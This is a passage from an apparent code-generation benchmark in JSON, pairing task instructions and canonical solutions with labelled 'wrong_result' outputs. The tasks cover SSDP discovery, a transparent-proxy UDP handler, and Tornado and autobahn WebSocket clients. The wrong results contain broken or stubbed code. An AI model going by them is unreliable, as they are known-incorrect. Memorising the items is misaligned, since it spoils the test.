    "wrong_result": "import socket\nimport threading\n\nclass SSDPDiscover:\n    def __init__(self, cb_on_device_response, host=None):\n        self.SSDP_ADDRESS = '239.255.255.250'\n        self.SSDP_PORT = 1900\n        self.SSDP_MX = 5\n        self.SSDP_TTL = 2\n        self.SSDP_AMOUNT = 10\n        self.MSEARCH_PORT = 0\n        self.MSEARCH_MSG = \"M-SEARCH * HTTP/1.1\\nHOST: {host}\\nMAN: \\\"ssdp:discover\\\"\\nST: {st}\\nMX: {mx}\\n\\n\"\n        self.BUFFER_SIZE = 65507\n        self.USE_SINGLE_SOCKET = True\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.addresses = self.refresh_addresses()\n        self.receive_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.receive_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.receive_socket.bind((self.host or '0.0.0.0', self.MSEARCH_PORT))\n        self.receive_thread = threading.Thread(target=self._receive_responses)\n        self.receive_thread.start()\n\n    def refresh_addresses(self):\n        import socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        try:\n            s.connect(('10.255.255.255', 1))\n            ip = s.getsockname()[0]\n        except:\n            ip = '127.0.0.1'\n        s.close()\n        return [ip]\n\n    def search(self, ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None):\n        self.SSDP_TTL = ssdp_ttl or self.SSDP_TTL\n        self.SSDP_MX = ssdp_mx or self.SSDP_MX\n        self.SSDP_AMOUNT = ssdp_amount or self.SSDP_AMOUNT\n        self._search()\n\n    def _search(self):\n        if self.USE_SINGLE_SOCKET:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            sock.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_TTL, self.SSDP_TTL)\n            sock.setsockopt(socket.SOL_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(self.SSDP_ADDRESS) + socket.inet_aton('224.0.0.1'))\n            sock.bind((self.host or '0.0.0.0', self.MSEARCH_PORT))\n            for _ in range(self.SSDP_AMOUNT):\n                self._send_discover(sock, self.SSDP_MX)\n        else:\n            for addr in self.addresses:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                sock.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_TTL, self.SSDP_TTL)\n                sock.setsockopt(socket.SOL_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(self.SSDP_ADDRESS) + socket.inet_aton('224.0.0.1'))\n                sock.bind((addr, self.MSEARCH_PORT))\n                for _ in range(self.SSDP_AMOUNT):\n                    self._send_discover(sock, self.SSDP_MX)\n\n    def _send_discover(self, sock, ssdp_mx):\n        msg = self.MSEARCH_MSG.format(host=self.SSDP_ADDRESS, st='upnp:rootdevice', mx=str(ssdp_mx))\n        sock.sendto(msg.encode(), (self.SSDP_ADDRESS, self.SSDP_PORT))\n\n    def _receive_responses(self):\n        while True:\n            data, addr = self.receive_socket.recvfrom(self.BUFFER_SIZE)\n            self.cb_on_device_response(data.decode(), addr)"
  },
  {
    "Task_id": 432,
    "Instruction": "Task Description: Implement a UDP socket handler class that provides advanced UDP communication capabilities, including receiving original destination addresses and supporting both IPv4 and IPv6 transparent proxying.\n\nClass Description: UDPSocketHandler is a utility class designed to handle UDP socket operations with special features like retrieving original destination addresses and supporting transparent proxying. It provides methods for receiving UDP packets with ancillary data, sending UDP packets with specific source addresses, and setting up UDP listeners with appropriate socket options.\n\nAttributes:\n- recvmsg: Optional[str] - Stores the detected implementation method for recvmsg ('python', 'socket_ext', or None)\n\nMethods:\n- _detect_recvmsg_implementation() -> Optional[str] - Detects available recvmsg implementation methods\n- recv_udp(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Receives UDP data with source and destination address information\n- _recv_udp_python(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Python native implementation of recv_udp\n- _recv_udp_socket_ext(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - socket_ext implementation of recv_udp\n- _recv_udp_fallback(listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes] - Fallback implementation without ancillary data support\n- send_udp(sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None - Sends UDP data with specified source address\n- setup_udp_listener(udp_listener: socket.socket) -> None - Configures UDP listener socket with transparent proxying options",
    "Canonical_solution": "import struct\nimport socket\nfrom typing import Optional, Tuple, Any\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        self.recvmsg = self._detect_recvmsg_implementation()\n        \n    def _detect_recvmsg_implementation(self) -> Optional[str]:\n        try:\n            import socket as pythonsocket\n            getattr(pythonsocket.socket, \"recvmsg\")\n            return \"python\"\n        except AttributeError:\n            try:\n                import socket_ext\n                getattr(socket_ext.socket, \"recvmsg\")\n                return \"socket_ext\"\n            except ImportError:\n                return None\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        if self.recvmsg == \"python\":\n            return self._recv_udp_python(listener, bufsize)\n        elif self.recvmsg == \"socket_ext\":\n            return self._recv_udp_socket_ext(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        data, ancdata, msg_flags, srcip = listener.recvmsg(4096, socket.CMSG_SPACE(24))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data)\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        srcip, data, adata, flags = listener.recvmsg((bufsize,), socket.CMSG_SPACE(24))\n        dstip = None\n        for a in adata:\n            if a.cmsg_level == socket.SOL_IP and a.cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif a.cmsg_level == SOL_IPV6 and a.cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data[0])\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes]:\n        data, srcip = listener.recvfrom(bufsize)\n        return (srcip, None, data)\n\n    def send_udp(self, sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None:\n        if not srcip:\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        if hasattr(udp_listener, 'v4') and udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if hasattr(udp_listener, 'v6') and udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\n\nclass UDPSocketHandler:\n    def __init__(self):\n        self.recvmsg = self._detect_recvmsg_implementation()\n\n    def _detect_recvmsg_implementation(self):\n        try:\n            import socket\n            if hasattr(socket, 'recvmsg'):\n                return 'python'\n            return None\n        except:\n            return None\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> tuple:\n        if self.recvmsg == 'python':\n            return self._recv_udp_python(listener, bufsize)\n        elif self.recvmsg == 'socket_ext':\n            return self._recv_udp_socket_ext(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> tuple:\n        data, ancdata, _ = listener.recvmsg(bufsize)\n        original_dst = None\n        for opt in ancdata:\n            if opt[0] == socket.SOL_IP and opt[1] == socket.SO_ORIGINAL_DST:\n                original_dst = opt[2]\n        if original_dst:\n            ip = socket.inet_ntoa(original_dst[0:4])\n            port = original_dst[4]\n            return (data, (ip, port), bytes(data))\n        else:\n            return (data, None, bytes(data))\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> tuple:\n        return (b'', None, b'')\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> tuple:\n        data, addr = listener.recvfrom(bufsize)\n        return (data, addr, bytes(data))\n\n    def send_udp(self, sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None:\n        if srcip:\n            sock.sendto(data, (srcip[0], srcip[1]))\n        else:\n            sock.sendto(data, dstip)\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        udp_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        udp_listener.bind(('0.0.0.0', 0))\n```"
  },
  {
    "Task_id": 434,
    "Instruction": "Task Description: Implement a WebSocket client connection using Tornado in Python, which handles WebSocket protocol communication including connection establishment, message exchange, and connection closure.\n\nClass Description: WebSocketClientConnection is a Tornado-based WebSocket client implementation that manages the lifecycle of a WebSocket connection, including handling messages, pings, and connection events.\n\nAttributes:\n- connect_future: Future - A future representing the connection attempt\n- read_queue: Queue - A queue for incoming messages\n- key: bytes - The WebSocket handshake key\n- _on_message_callback: Optional[Callable] - Callback for received messages\n- close_code: Optional[int] - WebSocket close code\n- close_reason: Optional[str] - WebSocket close reason\n- params: _WebSocketParams - WebSocket connection parameters\n- tcp_client: TCPClient - Underlying TCP client\n- protocol: Optional[WebSocketProtocol] - WebSocket protocol handler\n\nMethods:\n- __init__(request: HTTPRequest, on_message_callback: Optional[Callable], compression_options: Optional[Dict], ping_interval: Optional[float], ping_timeout: Optional[float], max_message_size: int, subprotocols: Optional[List[str]], resolver: Optional[Resolver]) -> None - Initializes the WebSocket client connection\n- close(code: Optional[int], reason: Optional[str]) -> None - Closes the WebSocket connection\n- on_connection_close() -> None - Handles connection closure\n- on_ws_connection_close(close_code: Optional[int], close_reason: Optional[str]) -> None - Handles WebSocket-specific connection closure\n- _on_http_response(response: HTTPResponse) -> None - Handles HTTP response during connection\n- headers_received(start_line: Union[RequestStartLine, ResponseStartLine], headers: HTTPHeaders) -> Awaitable[None] - Processes received headers\n- write_message(message: Union[str, bytes, Dict[str, Any]], binary: bool) -> Future[None] - Sends a WebSocket message\n- read_message(callback: Optional[Callable]) -> Awaitable[Union[None, str, bytes]] - Reads a message from the queue\n- _on_message(message: Union[None, str, bytes]) -> Optional[Awaitable[None]] - Internal message handler\n- ping(data: bytes) -> None - Sends a ping frame\n- get_websocket_protocol() -> WebSocketProtocol - Creates the WebSocket protocol handler",
    "Canonical_solution": "import abc\nimport asyncio\nimport base64\nimport hashlib\nimport os\nimport struct\nimport tornado\nfrom urllib.parse import urlparse\nimport zlib\nfrom tornado.concurrent import Future\nfrom tornado.escape import utf8, native_str, to_unicode\nfrom tornado import gen, httpclient, httputil\nfrom tornado.ioloop import IOLoop, PeriodicCallback\nfrom tornado.iostream import StreamClosedError, IOStream\nfrom tornado.log import app_log\nfrom tornado.netutil import Resolver\nfrom tornado import simple_httpclient\nfrom tornado.queues import Queue\nfrom tornado.tcpclient import TCPClient\nfrom tornado.util import _websocket_mask\nfrom typing import Optional, Dict, Union, List, Awaitable, Callable, Tuple, Type, Any, cast\n\n_default_max_message_size = 10 * 1024 * 1024\n\nclass WebSocketClientConnection(simple_httpclient._HTTPConnection):\n    def __init__(\n        self,\n        request: httpclient.HTTPRequest,\n        on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n        compression_options: Optional[Dict[str, Any]] = None,\n        ping_interval: Optional[float] = None,\n        ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        subprotocols: Optional[List[str]] = None,\n        resolver: Optional[Resolver] = None,\n    ) -> None:\n        self.connect_future = Future()\n        self.read_queue = Queue(1)\n        self.key = base64.b64encode(os.urandom(16))\n        self._on_message_callback = on_message_callback\n        self.close_code = None\n        self.close_reason = None\n        self.params = _WebSocketParams(\n            ping_interval=ping_interval,\n            ping_timeout=ping_timeout,\n            max_message_size=max_message_size,\n            compression_options=compression_options,\n        )\n\n        scheme, sep, rest = request.url.partition(\":\")\n        scheme = {\"ws\": \"http\", \"wss\": \"https\"}[scheme]\n        request.url = scheme + sep + rest\n        request.headers.update(\n            {\n                \"Upgrade\": \"websocket\",\n                \"Connection\": \"Upgrade\",\n                \"Sec-WebSocket-Key\": to_unicode(self.key),\n                \"Sec-WebSocket-Version\": \"13\",\n            }\n        )\n        if subprotocols is not None:\n            request.headers[\"Sec-WebSocket-Protocol\"] = \",\".join(subprotocols)\n        if compression_options is not None:\n            request.headers[\"Sec-WebSocket-Extensions\"] = (\n                \"permessage-deflate; client_max_window_bits\"\n            )\n\n        request.follow_redirects = False\n\n        self.tcp_client = TCPClient(resolver=resolver)\n        super().__init__(\n            None,\n            request,\n            lambda: None,\n            self._on_http_response,\n            104857600,\n            self.tcp_client,\n            65536,\n            104857600,\n        )\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if self.protocol is not None:\n            self.protocol.close(code, reason)\n            self.protocol = None\n\n    def on_connection_close(self) -> None:\n        if not self.connect_future.done():\n            self.connect_future.set_exception(StreamClosedError())\n        self._on_message(None)\n        self.tcp_client.close()\n        super().on_connection_close()\n\n    def on_ws_connection_close(\n        self, close_code: Optional[int] = None, close_reason: Optional[str] = None\n    ) -> None:\n        self.close_code = close_code\n        self.close_reason = close_reason\n        self.on_connection_close()\n\n    def _on_http_response(self, response: httpclient.HTTPResponse) -> None:\n        if not self.connect_future.done():\n            if response.error:\n                self.connect_future.set_exception(response.error)\n            else:\n                self.connect_future.set_exception(\n                    WebSocketError(\"Non-websocket response\")\n                )\n\n    async def headers_received(\n        self,\n        start_line: Union[httputil.RequestStartLine, httputil.ResponseStartLine],\n        headers: httputil.HTTPHeaders,\n    ) -> None:\n        assert isinstance(start_line, httputil.ResponseStartLine)\n        if start_line.code != 101:\n            await super().headers_received(start_line, headers)\n            return\n\n        if self._timeout is not None:\n            self.io_loop.remove_timeout(self._timeout)\n            self._timeout = None\n\n        self.headers = headers\n        self.protocol = self.get_websocket_protocol()\n        self.protocol._process_server_headers(self.key, self.headers)\n        self.protocol.stream = self.connection.detach()\n\n        IOLoop.current().add_callback(self.protocol._receive_frame_loop)\n        self.protocol.start_pinging()\n\n        self.final_callback = None\n        future_set_result_unless_cancelled(self.connect_future, self)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if self.protocol is None:\n            raise WebSocketClosedError(\"Client connection has been closed\")\n        return self.protocol.write_message(message, binary=binary)\n\n    def read_message(\n        self,\n        callback: Optional[Callable[[\"Future[Union[None, str, bytes]]\"], None]] = None,\n    ) -> Awaitable[Union[None, str, bytes]]:\n        awaitable = self.read_queue.get()\n        if callback is not None:\n            self.io_loop.add_future(asyncio.ensure_future(awaitable), callback)\n        return awaitable\n\n    def _on_message(\n        self, message: Union[None, str, bytes]\n    ) -> Optional[Awaitable[None]]:\n        if self._on_message_callback:\n            self._on_message_callback(message)\n            return None\n        else:\n            return self.read_queue.put(message)\n\n    def ping(self, data: bytes = b\"\") -> None:\n        data = utf8(data)\n        if self.protocol is None:\n            raise WebSocketClosedError()\n        self.protocol.write_ping(data)\n\n    def get_websocket_protocol(self) -> \"WebSocketProtocol\":\n        return WebSocketProtocol13(self, mask_outgoing=True, params=self.params)\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self.protocol.selected_subprotocol\n\nclass _WebSocketParams:\n    def __init__(\n        self,\n        ping_interval: Optional[float] = None,\n        ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        compression_options: Optional[Dict[str, Any]] = None,\n    ) -> None:\n        self.ping_interval = ping_interval\n        self.ping_timeout = ping_timeout\n        self.max_message_size = max_message_size\n        self.compression_options = compression_options\n\nclass WebSocketProtocol(abc.ABC):\n    def __init__(self, handler: Any) -> None:\n        self.handler = handler\n        self.stream = None\n        self.client_terminated = False\n        self.server_terminated = False\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        raise NotImplementedError()\n\n    def is_closing(self) -> bool:\n        raise NotImplementedError()\n\n    async def accept_connection(self, handler: Any) -> None:\n        raise NotImplementedError()\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        raise NotImplementedError()\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        raise NotImplementedError()\n\n    def write_ping(self, data: bytes) -> None:\n        raise NotImplementedError()\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        raise NotImplementedError()\n\n    def start_pinging(self) -> None:\n        raise NotImplementedError()\n\n    async def _receive_frame_loop(self) -> None:\n        raise NotImplementedError()\n\n    def set_nodelay(self, x: bool) -> None:\n        raise NotImplementedError()\n\nclass WebSocketProtocol13(WebSocketProtocol):\n    FIN = 0x80\n    RSV1 = 0x40\n    RSV2 = 0x20\n    RSV3 = 0x10\n    RSV_MASK = RSV1 | RSV2 | RSV3\n    OPCODE_MASK = 0x0F\n\n    def __init__(\n        self,\n        handler: Any,\n        mask_outgoing: bool,\n        params: _WebSocketParams,\n    ) -> None:\n        super().__init__(handler)\n        self.mask_outgoing = mask_outgoing\n        self.params = params\n        self._final_frame = False\n        self._frame_opcode = None\n        self._frame_mask = None\n        self._frame_length = None\n        self._fragmented_message_buffer = None\n        self._fragmented_message_opcode = None\n        self._waiting = None\n        self._compression_options = params.compression_options\n        self._decompressor = None\n        self._compressor = None\n        self._frame_compressed = None\n        self._message_bytes_in = 0\n        self._message_bytes_out = 0\n        self._wire_bytes_in = 0\n        self._wire_bytes_out = 0\n        self.ping_callback = None\n        self.last_ping = 0.0\n        self.last_pong = 0.0\n        self.close_code = None\n        self.close_reason = None\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self._selected_subprotocol\n\n    @selected_subprotocol.setter\n    def selected_subprotocol(self, value: Optional[str]) -> None:\n        self._selected_subprotocol = value\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        assert headers[\"Upgrade\"].lower() == \"websocket\"\n        assert headers[\"Connection\"].lower() == \"upgrade\"\n        accept = self.compute_accept_value(key)\n        assert headers[\"Sec-Websocket-Accept\"] == accept\n\n        extensions = self._parse_extensions_header(headers)\n        for ext in extensions:\n            if ext[0] == \"permessage-deflate\" and self._compression_options is not None:\n                self._create_compressors(\"client\", ext[1])\n            else:\n                raise ValueError(\"unsupported extension %r\", ext)\n\n        self.selected_subprotocol = headers.get(\"Sec-WebSocket-Protocol\", None)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if binary:\n            opcode = 0x2\n        else:\n            opcode = 0x1\n        if isinstance(message, dict):\n            message = tornado.escape.json_encode(message)\n        message = tornado.escape.utf8(message)\n        assert isinstance(message, bytes)\n        self._message_bytes_out += len(message)\n        flags = 0\n        if self._compressor:\n            message = self._compressor.compress(message)\n            flags |= self.RSV1\n        try:\n            fut = self._write_frame(True, opcode, message, flags=flags)\n        except StreamClosedError:\n            raise WebSocketClosedError()\n\n        async def wrapper() -> None:\n            try:\n                await fut\n            except StreamClosedError:\n                raise WebSocketClosedError()\n\n        return asyncio.ensure_future(wrapper())\n\n    def write_ping(self, data: bytes) -> None:\n        assert isinstance(data, bytes)\n        self._write_frame(True, 0x9, data)\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if not self.server_terminated:\n            if not self.stream.closed():\n                if code is None and reason is not None:\n                    code = 1000\n                if code is None:\n                    close_data = b\"\"\n                else:\n                    close_data = struct.pack(\">H\", code)\n                if reason is not None:\n                    close_data += utf8(reason)\n                try:\n                    self._write_frame(True, 0x8, close_data)\n                except StreamClosedError:\n                    self._abort()\n            self.server_terminated = True\n        if self.client_terminated:\n            if self._waiting is not None:\n                self.stream.io_loop.remove_timeout(self._waiting)\n                self._waiting = None\n            self.stream.close()\n        elif self._waiting is None:\n            self._waiting = self.stream.io_loop.add_timeout(\n                self.stream.io_loop.time() + 5, self._abort\n            )\n        if self.ping_callback:\n            self.ping_callback.stop()\n            self.ping_callback = None\n\n    def is_closing(self) -> bool:\n        return self.stream.closed() or self.client_terminated or self.server_terminated\n\n    def start_pinging(self) -> None:\n        if self.ping_interval is not None and self.ping_interval > 0:\n            self.last_ping = self.last_pong = IOLoop.current().time()\n            self.ping_callback = PeriodicCallback(\n                self.periodic_ping, self.ping_interval * 1000\n            )\n            self.ping_callback.start()\n\n    @staticmethod\n    def compute_accept_value(key: Union[str, bytes]) -> str:\n        sha1 = hashlib.sha1()\n        sha1.update(utf8(key))\n        sha1.update(b\"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\")\n        return native_str(base64.b64encode(sha1.digest()))\n\n    def _parse_extensions_header(\n        self, headers: httputil.HTTPHeaders\n    ) -> List[Tuple[str, Dict[str, str]]]:\n        extensions = headers.get(\"Sec-WebSocket-Extensions\", \"\")\n        if extensions:\n            return [httputil._parse_header(e.strip()) for e in extensions.split(\",\")]\n        return []\n\n    def _write_frame(\n        self, fin: bool, opcode: int, data: bytes, flags: int = 0\n    ) -> \"Future[None]\":\n        data_len = len(data)\n        if opcode & 0x8:\n            if not fin:\n                raise ValueError(\"control frames may not be fragmented\")\n            if data_len > 125:\n                raise ValueError(\"control frame payloads may not exceed 125 bytes\")\n        if fin:\n            finbit = self.FIN\n        else:\n            finbit = 0\n        frame = struct.pack(\"B\", finbit | opcode | flags)\n        if self.mask_outgoing:\n            mask_bit = 0x80\n        else:\n            mask_bit = 0\n        if data_len < 126:\n            frame += struct.pack(\"B\", data_len | mask_bit)\n        elif data_len <= 0xFFFF:\n            frame += struct.pack(\"!BH\", 126 | mask_bit, data_len)\n        else:\n            frame += struct.pack(\"!BQ\", 127 | mask_bit, data_len)\n        if self.mask_outgoing:\n            mask = os.urandom(4)\n            data = mask + _websocket_mask(mask, data)\n        frame += data\n        self._wire_bytes_out += len(frame)\n        return self.stream.write(frame)\n\ndef websocket_connect(\n    url: Union[str, httpclient.HTTPRequest],\n    callback: Optional[Callable[[\"Future[WebSocketClientConnection]\"], None]] = None,\n    connect_timeout: Optional[float] = None,\n    on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n    compression_options: Optional[Dict[str, Any]] = None,\n    ping_interval: Optional[float] = None,\n    ping_timeout: Optional[float] = None,\n    max_message_size: int = _default_max_message_size,\n    subprotocols: Optional[List[str]] = None,\n    resolver: Optional[Resolver] = None,\n) -> \"Awaitable[WebSocketClientConnection]\":\n    if isinstance(url, httpclient.HTTPRequest):\n        assert connect_timeout is None\n        request = url\n        request.headers = httputil.HTTPHeaders(request.headers)\n    else:\n        request = httpclient.HTTPRequest(url, connect_timeout=connect_timeout)\n    request = cast(\n        httpclient.HTTPRequest,\n        httpclient._RequestProxy(request, httpclient.HTTPRequest._DEFAULTS),\n    )\n    conn = WebSocketClientConnection(\n        request,\n        on_message_callback=on_message_callback,\n        compression_options=compression_options,\n        ping_interval=ping_interval,\n        ping_timeout=ping_timeout,\n        max_message_size=max_message_size,\n        subprotocols=subprotocols,\n        resolver=resolver,\n    )\n    if callback is not None:\n        IOLoop.current().add_future(conn.connect_future, callback)\n    return conn.connect_future",
    "Code_level": "Class-level",
    "FSMID_for_test": 51,
    "wrong_result": "import asyncio\nimport tornado.ioloop\nimport tornado.httpclient\nimport tornado.websocket\nimport tornado.concurrent\nfrom typing import Optional, Union, Dict, List, Any, Callable, Awaitable\nimport asyncio.queue\nimport asyncio.streams\n\nclass WebSocketClientConnection:\n    def __init__(self, request: tornado.httpclient.HTTPRequest, on_message_callback: Optional[Callable], compression_options: Optional[Dict], ping_interval: Optional[float], ping_timeout: Optional[float], max_message_size: int, subprotocols: Optional[List[str]], resolver: Optional[tornado.netutil.Resolver]) -> None:\n        self.connect_future = tornado.concurrent.Future()\n        self.read_queue = asyncio.Queue()\n        self.key = b''\n        self._on_message_callback = on_message_callback\n        self.close_code = None\n        self.close_reason = None\n        self.params = {}\n        self.tcp_client = tornado.netutil.TCPClient()\n        self.protocol = None\n\n    def close(self, code: Optional[int], reason: Optional[str]) -> None:\n        pass\n\n    def on_connection_close(self) -> None:\n        pass\n\n    def on_ws_connection_close(self, close_code: Optional[int], close_reason: Optional[str]) -> None:\n        pass\n\n    def _on_http_response(self, response: tornado.httpclient.HTTPResponse) -> None:\n        pass\n\n    def headers_received(self, start_line: Union[tornado.httpclient.RequestStartLine, tornado.httpclient.ResponseStartLine], headers: tornado.httpclient.HTTPHeaders) -> Awaitable[None]:\n        pass\n\n    def write_message(self, message: Union[str, bytes, Dict[str, Any]], binary: bool) -> tornado.concurrent.Future[None]:\n        pass\n\n    def read_message(self, callback: Optional[Callable]) -> Awaitable[Union[None, str, bytes]]:\n        pass\n\n    def _on_message(self, message: Union[None, str, bytes]) -> Optional[Awaitable[None]]:\n        pass\n\n    def ping(self, data: bytes) -> None:\n        pass\n\n    def get_websocket_protocol(self) -> tornado.websocket.WebSocketProtocol:\n        pass"
  },
  {
    "Task_id": 435,
    "Instruction": "Task Description: Implement a WebSocket client using autobahn and twisted in Python to connect to a server, send a random number, receive the squared result, and then close the connection.\n\nClass Description: The WebSocketClient class establishes a WebSocket connection to a specified server, handles the communication protocol, and manages the connection lifecycle.\n\nAttributes:\n- host: str - The IP address or hostname of the WebSocket server (default: \"127.0.0.1\").\n- port: int - The port number of the WebSocket server (default: 9000).\n- factory: WebSocketClientFactory - The factory instance responsible for creating protocol instances and managing the WebSocket connection.\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket client with the specified host and port.\n- run() -> None - Connects to the WebSocket server using the reactor and starts the event loop.\n\nNested Class: SlowSquareClientProtocol(WebSocketClientProtocol) - Handles the WebSocket protocol events for the client.\n\nMethods (SlowSquareClientProtocol):\n- onOpen() -> None - Called when the WebSocket connection is established. Sends a random number to the server.\n- onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received from the server. Processes the squared result and closes the connection.\n- onClose(wasClean: bool, code: int, reason: str) -> None - Called when the WebSocket connection is closed. Stops the reactor loop.",
    "Canonical_solution": "from autobahn.twisted.websocket import WebSocketClientProtocol, WebSocketClientFactory\nimport json\nimport random\nfrom twisted.internet import reactor\n\nclass SlowSquareClientProtocol(WebSocketClientProtocol):\n    def onOpen(self):\n        x = 10. * random.random()\n        self.sendMessage(json.dumps(x).encode('utf8'))\n        print(\"Request to square {} sent.\".format(x))\n\n    def onMessage(self, payload, isBinary):\n        if not isBinary:\n            res = json.loads(payload.decode('utf8'))\n            print(\"Result received: {}\".format(res))\n            self.sendClose()\n\n    def onClose(self, wasClean, code, reason):\n        if reason:\n            print(reason)\n        reactor.stop()\n\nclass WebSocketClient:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketClientFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = SlowSquareClientProtocol\n\n    def run(self):\n        reactor.connectTCP(self.host, self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 53,
    "wrong_result": "import random\nfrom autobahn.twisted.websocket import WebSocketClientProtocol, WebSocketClientFactory\nfrom twisted.internet import reactor\n\nclass SlowSquareClientProtocol(WebSocketClientProtocol):\n    def onOpen(self):\n        num = random.randint(1, 100)\n        self.send(str(num))\n\n    def onMessage(self, payload, isBinary):\n        if not isBinary:\n            squared = int(payload) ** 2\n            self.close()\n\n    def onClose(self, wasClean, code, reason):\n        reactor.stop()\n\nclass WebSocketClient:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketClientFactory(SlowSquareClientProtocol)\n\n    def run(self):\n        reactor.connectWebSocket(self.host, self.port, self.factory)"
  },
  {
    "Task_id": 437,
